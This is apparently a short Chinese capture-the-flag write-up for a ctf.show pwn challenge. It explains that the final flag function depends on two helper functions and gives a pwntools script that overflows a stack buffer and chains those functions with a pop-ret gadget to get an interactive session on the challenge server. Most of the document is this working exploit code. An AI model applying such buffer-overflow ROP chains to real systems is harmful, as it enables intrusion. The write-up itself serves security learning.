# 挑战简介
你是我的谁，我的我是你的谁

# 思路
这边强度就低得多了，三个flag函数，主flag需求flag1和flag2得返回结果为一，且传入一个参数，相当于一个函数套娃题

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p = remote("pwn.challenge.ctf.show",28312)
elf = ELF('D:\edge 下载\pwn')

offset = 0x2C+ 0x4

p.recvuntil("Input your flag: ")

flag1 = 0x08048586

flag2 = 0x0804859D

flag = 0x08048606

pop_ebp_ret = 0x0804859b

p.sendline(b"a"*offset + p32(flag1) + p32(flag2) + p32(pop_ebp_ret) + p32(0xACACACAC) + p32(flag) + p32(pop_ebp_ret) + p32(0xBDBDBDBD))

p.interactive()

```
